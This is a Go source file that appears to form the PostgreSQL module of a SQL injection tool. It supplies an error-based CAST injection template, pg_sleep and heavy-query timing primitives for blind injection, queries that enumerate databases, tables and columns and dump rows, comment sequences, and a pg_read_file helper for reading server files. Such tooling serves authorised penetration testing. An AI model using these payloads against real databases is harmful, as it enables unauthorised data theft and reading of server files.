package dbms

import (
	"fmt"
	"strings"
)

// PostgreSQL implements the DBMS interface for PostgreSQL databases.
type PostgreSQL struct{}

// Name returns the canonical DBMS name.
func (p *PostgreSQL) Name() string {
	return "PostgreSQL"
}

// --- String operations ---

// Concatenate returns a PostgreSQL concatenation using the || operator.
func (p *PostgreSQL) Concatenate(parts ...string) string {
	if len(parts) == 1 {
		return parts[0]
	}
	return strings.Join(parts, "||")
}

// Substring returns a PostgreSQL SUBSTRING(expr FROM start FOR length) expression.
func (p *PostgreSQL) Substring(expr string, start, length int) string {
	return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", expr, start, length)
}

// Length returns a PostgreSQL LENGTH(expr) expression.
func (p *PostgreSQL) Length(expr string) string {
	return fmt.Sprintf("LENGTH(%s)", expr)
}

// ASCII returns a PostgreSQL ASCII(expr) expression.
func (p *PostgreSQL) ASCII(expr string) string {
	return fmt.Sprintf("ASCII(%s)", expr)
}

// Char returns a PostgreSQL CHR(code) expression.
func (p *PostgreSQL) Char(code int) string {
	return fmt.Sprintf("CHR(%d)", code)
}

// --- Version and identity ---

// VersionQuery returns the PostgreSQL expression to retrieve the server version.
func (p *PostgreSQL) VersionQuery() string {
	return "version()"
}

// CurrentUserQuery returns the PostgreSQL expression to retrieve the current user.
func (p *PostgreSQL) CurrentUserQuery() string {
	return "CURRENT_USER"
}

// CurrentDBQuery returns the PostgreSQL expression to retrieve the current database.
func (p *PostgreSQL) CurrentDBQuery() string {
	return "CURRENT_DATABASE()"
}

// HostnameQuery returns the PostgreSQL expression to retrieve the server address.
func (p *PostgreSQL) HostnameQuery() string {
	return "inet_server_addr()"
}

// --- Enumeration queries ---

// ListDatabasesQuery returns a SQL query to list all databases.
func (p *PostgreSQL) ListDatabasesQuery() string {
	return "SELECT datname FROM pg_database"
}

// ListTablesQuery returns a SQL query to list all tables in the given database.
func (p *PostgreSQL) ListTablesQuery(database string) string {
	return fmt.Sprintf("SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_catalog='%s'", database)
}

// ListColumnsQuery returns a SQL query to list all columns in the given table.
func (p *PostgreSQL) ListColumnsQuery(database, table string) string {
	return fmt.Sprintf("SELECT column_name FROM information_schema.columns WHERE table_catalog='%s' AND table_name='%s'", database, table)
}

// CountRowsQuery returns a SQL query to count rows in the given table.
// PostgreSQL operates within the current database context, so the database
// parameter is not used in the FROM clause.
func (p *PostgreSQL) CountRowsQuery(database, table string) string {
	return fmt.Sprintf("SELECT COUNT(*) FROM %s", table)
}

// DumpQuery returns a SQL query to dump rows from the given table.
// PostgreSQL operates within the current database context.
func (p *PostgreSQL) DumpQuery(database, table string, columns []string, offset, limit int) string {
	return fmt.Sprintf("SELECT %s FROM %s LIMIT %d OFFSET %d",
		strings.Join(columns, ","), table, limit, offset)
}

// --- Error-based payloads ---

// ErrorPayloads returns PostgreSQL-specific error-based injection payload templates.
func (p *PostgreSQL) ErrorPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Name:     "cast",
			Template: "CAST(({{.Query}}) AS INT)",
			Columns:  1,
			DBMS:     "PostgreSQL",
		},
	}
}

// --- Time-based ---

// SleepFunction returns a PostgreSQL pg_sleep(n) expression.
func (p *PostgreSQL) SleepFunction(seconds int) string {
	return fmt.Sprintf("pg_sleep(%d)", seconds)
}

// HeavyQuery returns a PostgreSQL CPU-intensive query for time-based detection.
func (p *PostgreSQL) HeavyQuery() string {
	return "SELECT COUNT(*) FROM generate_series(1,5000000)"
}

// --- Boolean constructs ---

// IfThenElse returns a PostgreSQL CASE WHEN ... THEN ... ELSE ... END expression.
func (p *PostgreSQL) IfThenElse(condition, trueExpr, falseExpr string) string {
	return fmt.Sprintf("CASE WHEN %s THEN %s ELSE %s END", condition, trueExpr, falseExpr)
}

// --- Quoting and comments ---

// QuoteString wraps the string in single quotes, escaping embedded single quotes.
func (p *PostgreSQL) QuoteString(s string) string {
	escaped := strings.ReplaceAll(s, "'", "''")
	return fmt.Sprintf("'%s'", escaped)
}

// CommentSequence returns the PostgreSQL line comment sequence.
func (p *PostgreSQL) CommentSequence() string {
	return "-- "
}

// InlineComment returns the PostgreSQL inline comment syntax.
func (p *PostgreSQL) InlineComment() string {
	return "/**/"
}

// --- File operations ---

// FileReadQuery returns a PostgreSQL expression to read a file from the server.
func (p *PostgreSQL) FileReadQuery(path string) string {
	return fmt.Sprintf("pg_read_file('%s')", path)
}

// --- Capabilities ---

// Capabilities returns the feature set supported by PostgreSQL.
func (p *PostgreSQL) Capabilities() Capabilities {
	return Capabilities{
		StackedQueries: true,
		ErrorBased:     true,
		UnionBased:     true,
		FileRead:       true,
		FileWrite:      true,
		OSCommand:      false,
		OutOfBand:      false,
		Subqueries:     true,
		CaseWhen:       true,
		LimitOffset:    true,
	}
}
